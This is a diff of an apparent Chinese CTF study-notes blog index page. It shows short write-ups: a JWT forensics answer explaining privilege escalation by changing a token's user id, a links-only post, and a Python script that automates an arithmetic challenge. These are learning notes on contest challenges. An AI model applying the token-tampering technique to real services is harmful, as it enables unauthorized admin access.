@@ -1,80 +1,1389 @@
-<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>CTF学习笔记</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><link rel="preload" as="font" crossorigin="anonymous" href="/font/Bender.ttf"><link rel="preload" as="font" crossorigin="anonymous" href="/font/BenderLight.ttf"><link rel="preload" as="font" crossorigin="anonymous" href="/font/JetBrainsMono-Regular.woff2"><link rel="stylesheet" href="/css/arknights.css"><style>@font-face {
-  font-family: Bender;
-  src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
-}
-@font-face {
-  font-family: BenderLight;
-  src: local('BenderLight'), url("/font/BenderLight.ttf");
-}
-@font-face {
-  font-family: 'JetBrains Mono';
-  src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
-}
-</style><script>var config = {"root":"/","code_fold":15,"search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"复制"}}</script><link rel="stylesheet" href="//unpkg.com/@waline/client@v2/dist/waline.css"><link type="text/css" rel="stylesheet" href="/lib/encrypt/hbe.style.css"><script src="//unpkg.com/mermaid@10.5.0/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
- document.documentElement.setAttribute('theme-mode', 'light')
-if (window.localStorage.getItem('theme-mode') === 'dark')
- document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
- font-family: BenderLight;
- src: local('Bender'), url("/font/BenderLight.woff2") format('woff2');
-}
-@font-face {
- font-family: 'JetBrains Mono';
- src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
-}</style><style>:root {
- --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
- --light-background: url('/img/bk.jpg');
- --theme-encrypt-confirm: '确认'
-}</style><script defer src="/js/arknights.js"></script><script defer src="/js/search.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script defer type="module">import mermaid from '//unpkg.com/mermaid@10.5.0/dist/mermaid.esm.mjs';
-window.mermaid = mermaid;
-code.paintMermaid();
-</script><script async type="module">import { init } from '//unpkg.com/@waline/client@v2/dist/waline.mjs';
-window.waline = init;
-</script><script async src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script async src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script async src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script async src="/lib/encrypt/hbe.js"></script><script async src="/js/pjax.js"></script><script class="pjax-js">reset= () => {if (document.querySelector('#waline'))
- waline({
-   el: '#waline',
-   dark: ':root[theme-mode="dark"]',
-   serverURL: '',
-   path: window.location.pathname,
- });document.querySelector('.lg-container')?.remove()
-lightGallery(document.getElementById('post-bg'), {
-  plugins: [lgZoom,lgThumbnail],
-  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
- cacheBust: false,
- selectors: ['title','article','#aside-block','.pjax-js','data-pjax','.busuanzi'],
- switches: {'article': Pjax.switches.sideBySide},
- switchesOptions: {
-   'article': {
-     classNames: {
-       remove: "pjax-out",
-       add: "pjax-in"
-     }
-   }
- }
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.22.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="JNU_WEB">
+<meta property="og:type" content="website">
+<meta property="og:title" content="CTF学习笔记">
+<meta property="og:url" content="http://example.com/page/2/index.html">
+<meta property="og:site_name" content="CTF学习笔记">
+<meta property="og:description" content="JNU_WEB">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="温柔刀">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://example.com/page/2/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"page/2/index.html","title":""}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>CTF学习笔记</title>
+  
+
+
+
+
+
+
+
+<link rel="dns-prefetch" href="comment-three-tau.vercel.app">
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">CTF学习笔记</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-overview-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">温柔刀</p>
+  <div class="site-description" itemprop="description">JNU_WEB</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">35</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">29</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/02/22/%C2%96-%E9%99%87%E5%89%91%E6%9D%AF-2021-jwt%EF%BC%88%E9%97%AE2%EF%BC%89/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="温柔刀">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CTF学习笔记">
+      <meta itemprop="description" content="JNU_WEB">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | CTF学习笔记">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2025/02/22/%C2%96-%E9%99%87%E5%89%91%E6%9D%AF-2021-jwt%EF%BC%88%E9%97%AE2%EF%BC%89/" class="post-title-link" itemprop="url">[陇剑杯 2021]jwt（问2）</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2025-02-22 14:06:39 / 修改时间：14:10:15" itemprop="dateCreated datePublished" datetime="2025-02-22T14:06:39+08:00">2025-02-22</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Misc/" itemprop="url" rel="index"><span itemprop="name">Misc</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+    <span class="post-meta-item-icon">
+      <i class="far fa-comment"></i>
+    </span>
+    <span class="post-meta-item-text">Waline：</span>
+  
+    <a title="waline" href="/2025/02/22/%C2%96-%E9%99%87%E5%89%91%E6%9D%AF-2021-jwt%EF%BC%88%E9%97%AE2%EF%BC%89/#waline" itemprop="discussionUrl">
+      <span class="post-comments-count waline-comment-count" data-path="/2025/02/22/%C2%96-%E9%99%87%E5%89%91%E6%9D%AF-2021-jwt%EF%BC%88%E9%97%AE2%EF%BC%89/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>99</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>1 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>题目说攻击者是进行了绕过的，流量里登录了两遍，登陆之后执行whoami都是失败的，返回权限不足，下面第三遍执行whoami时突然成功了，结合查到的jwt绕过方法，攻击者是修改tocken值进行绕过的，将原本10086的id改为了10087，获取到了管理员权限</p>
+<img src="/2025/02/22/%C2%96-%E9%99%87%E5%89%91%E6%9D%AF-2021-jwt%EF%BC%88%E9%97%AE2%EF%BC%89/QQ20250222-140911.png" class="" title="QQ20250222-140911">
+
+
+
+<img src="/2025/02/22/%C2%96-%E9%99%87%E5%89%91%E6%9D%AF-2021-jwt%EF%BC%88%E9%97%AE2%EF%BC%89/QQ20250222-140947.png" class="" title="QQ20250222-140947">
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/02/22/DownUnderCTF-2022-no-symlink/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="温柔刀">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CTF学习笔记">
+      <meta itemprop="description" content="JNU_WEB">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | CTF学习笔记">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2025/02/22/DownUnderCTF-2022-no-symlink/" class="post-title-link" itemprop="url">[DownUnderCTF 2022]no_symlink</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2025-02-22 13:53:05 / 修改时间：20:40:05" itemprop="dateCreated datePublished" datetime="2025-02-22T13:53:05+08:00">2025-02-22</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+    <span class="post-meta-item-icon">
+      <i class="far fa-comment"></i>
+    </span>
+    <span class="post-meta-item-text">Waline：</span>
+  
+    <a title="waline" href="/2025/02/22/DownUnderCTF-2022-no-symlink/#waline" itemprop="discussionUrl">
+      <span class="post-comments-count waline-comment-count" data-path="/2025/02/22/DownUnderCTF-2022-no-symlink/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>41</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>1 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>看不懂，跪了</p>
+<p><a target="_blank" rel="noopener" href="https://lebr0nli.github.io/blog/security/DownUnderCTF-2022/#no-symlink-web">https://lebr0nli.github.io/blog/security/DownUnderCTF-2022/#no-symlink-web</a></p>
+<p><a target="_blank" rel="noopener" href="http://blog.maple3142.net/2022/09/25/downunderctf-2022-writeups/#no-symlink">http://blog.maple3142.net/2022/09/25/downunderctf-2022-writeups/#no-symlink</a></p>
+<p><a target="_blank" rel="noopener" href="https://leihehe.top/2022/09/26/DownUnder-CTF-2022-writeup/#no-symlink-Symlink-and-file-permission-trick">https://leihehe.top/2022/09/26/DownUnder-CTF-2022-writeup/#no-symlink-Symlink-and-file-permission-trick</a></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/02/21/SWPUCTF-2024-%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B-%E5%8C%BA%E5%8C%BA%E7%AE%97%E6%95%B0%E7%BD%A2%E4%BA%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="温柔刀">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CTF学习笔记">
+      <meta itemprop="description" content="JNU_WEB">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | CTF学习笔记">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2025/02/21/SWPUCTF-2024-%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B-%E5%8C%BA%E5%8C%BA%E7%AE%97%E6%95%B0%E7%BD%A2%E4%BA%86/" class="post-title-link" itemprop="url">[SWPUCTF 2024 秋季新生赛]区区算数罢了</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-02-21 20:28:50" itemprop="dateCreated datePublished" datetime="2025-02-21T20:28:50+08:00">2025-02-21</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-02-22 20:40:30" itemprop="dateModified" datetime="2025-02-22T20:40:30+08:00">2025-02-22</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+    <span class="post-meta-item-icon">
+      <i class="far fa-comment"></i>
+    </span>
+    <span class="post-meta-item-text">Waline：</span>
+  
+    <a title="waline" href="/2025/02/21/SWPUCTF-2024-%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B-%E5%8C%BA%E5%8C%BA%E7%AE%97%E6%95%B0%E7%BD%A2%E4%BA%86/#waline" itemprop="discussionUrl">
+      <span class="post-comments-count waline-comment-count" data-path="/2025/02/21/SWPUCTF-2024-%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B-%E5%8C%BA%E5%8C%BA%E7%AE%97%E6%95%B0%E7%BD%A2%E4%BA%86/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>414</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>2 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <img src="/2025/02/21/SWPUCTF-2024-%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B-%E5%8C%BA%E5%8C%BA%E7%AE%97%E6%95%B0%E7%BD%A2%E4%BA%86/QQ20250221-203033.png" class="" title="QQ20250221-203033">
+
+<p>一开始的思路：</p>
+<p>和NewStarCTF你能在一秒内打出八句英文吗类似，经典脚本题，思路：先获取页面中需要输入的英文文本，再提交你获得的的文本。</p>
+<p>详见：<a target="_blank" rel="noopener" href="http://ns.openctf.net/wp/2024/week2/web/bajuyingwen.html">http://ns.openctf.net/wp/2024/week2/web/bajuyingwen.html</a></p>
+<p>脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="comment"># 初始化</span></span><br><span class="line">BASE_URL = <span class="string">&#x27;http://node6.anna.nssctf.cn:27519/&#x27;</span></span><br><span class="line">session = requests.Session() <span class="comment"># 让网页知道一直都是你</span></span><br><span class="line">correct_count = <span class="number">0</span></span><br><span class="line"><span class="comment"># 把奇怪的符号去掉留下加减乘除</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_expression</span>(<span class="params">original</span>):</span><br><span class="line">    clean_exp = re.sub(<span class="string">r&#x27;[^\d\-+*/]&#x27;</span>, <span class="string">&#x27;&#x27;</span>, original)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(clean_exp)</span><br><span class="line"><span class="comment"># 向服务器发送 GET 请求，获取题目数据。返回的数据是 JSON 格式。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_question</span>():</span><br><span class="line">    resp = session.get(<span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/get_question&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> resp.json()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这个函数负责将计算出的答案提交给服务器进行验证。</span></span><br><span class="line">它将题目相关数据（比如问题、计算的答案、时间戳等）作为 payload 数据发送到服务器。</span><br><span class="line">服务器会返回一个 JSON 响应，通常包含验证结果。</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_answer</span>(<span class="params">data, answer</span>):</span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">&quot;question&quot;</span>: data[<span class="string">&#x27;question&#x27;</span>],</span><br><span class="line">        <span class="string">&quot;answer&quot;</span>: answer,</span><br><span class="line">        <span class="string">&quot;timestamp&quot;</span>: data[<span class="string">&#x27;timestamp&#x27;</span>],</span><br><span class="line">        <span class="string">&quot;correct_answer&quot;</span>: data[<span class="string">&#x27;answer&#x27;</span>],</span><br><span class="line">        <span class="string">&quot;original&quot;</span>: data[<span class="string">&#x27;original&#x27;</span>]</span><br><span class="line">    &#125;</span><br><span class="line">    resp = session.post(<span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/check_answer&quot;</span>, json=payload)</span><br><span class="line">    <span class="keyword">return</span> resp.json()</span><br><span class="line"><span class="comment"># 一旦正确答案数量达到 10（在前面的 while 循环中控制），这个函数会向服务器发送请求以获取 flag。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>():</span><br><span class="line">    payload = &#123;<span class="string">&quot;correct_answers&quot;</span>: <span class="number">10</span>&#125;</span><br><span class="line">    resp = session.post(<span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/get_flag&quot;</span>, json=payload)</span><br><span class="line">    <span class="keyword">return</span> resp.json()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> correct_count &lt; <span class="number">10</span>:</span><br><span class="line">    <span class="comment"># 获取题目</span></span><br><span class="line">    question_data = get_question()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 计算答案</span></span><br><span class="line">    calculated = solve_expression(question_data[<span class="string">&#x27;original&#x27;</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 提交验证</span></span><br><span class="line">    result = check_answer(question_data, calculated)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;第<span class="subst">&#123;correct_count + <span class="number">1</span>&#125;</span>题结果：<span class="subst">&#123;result[<span class="string">&#x27;message&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 更新计数器</span></span><br><span class="line">    <span class="keyword">if</span> result.get(<span class="string">&#x27;correct&#x27;</span>):</span><br><span class="line">        correct_count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        correct_count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取flag（严格对应前端逻辑）</span></span><br><span class="line">flag_data = get_flag()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;\n最终flag：<span class="subst">&#123;flag_data.get(<span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;未找到flag&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;完整flag响应：&quot;</span>, flag_data)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<p>顺便说一句<img src="/2025/02/21/SWPUCTF-2024-%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B-%E5%8C%BA%E5%8C%BA%E7%AE%97%E6%95%B0%E7%BD%A2%E4%BA%86/78DC9C9B4F4099D8EF5DBE56EFCDF3FB.png" class="" title="78DC9C9B4F4099D8EF5DBE56EFCDF3FB">，我搜网上wp的时候搜到的是</p>
+<p>此标题让我甚是想打</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/02/21/CS%E5%85%A5%E9%97%A8%E9%BB%91%E8%AF%9D%E6%94%B6%E9%9B%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="温柔刀">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CTF学习笔记">
+      <meta itemprop="description" content="JNU_WEB">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | CTF学习笔记">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2025/02/21/CS%E5%85%A5%E9%97%A8%E9%BB%91%E8%AF%9D%E6%94%B6%E9%9B%86/" class="post-title-link" itemprop="url">CS入门黑话收集</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-02-21 10:54:51" itemprop="dateCreated datePublished" datetime="2025-02-21T10:54:51+08:00">2025-02-21</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-02-22 20:41:05" itemprop="dateModified" datetime="2025-02-22T20:41:05+08:00">2025-02-22</time>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+    <span class="post-meta-item-icon">
+      <i class="far fa-comment"></i>
+    </span>
+    <span class="post-meta-item-text">Waline：</span>
+  
+    <a title="waline" href="/2025/02/21/CS%E5%85%A5%E9%97%A8%E9%BB%91%E8%AF%9D%E6%94%B6%E9%9B%86/#waline" itemprop="discussionUrl">
+      <span class="post-comments-count waline-comment-count" data-path="/2025/02/21/CS%E5%85%A5%E9%97%A8%E9%BB%91%E8%AF%9D%E6%94%B6%E9%9B%86/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>221</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>1 分钟</span>
+    </span>
+</div>
+
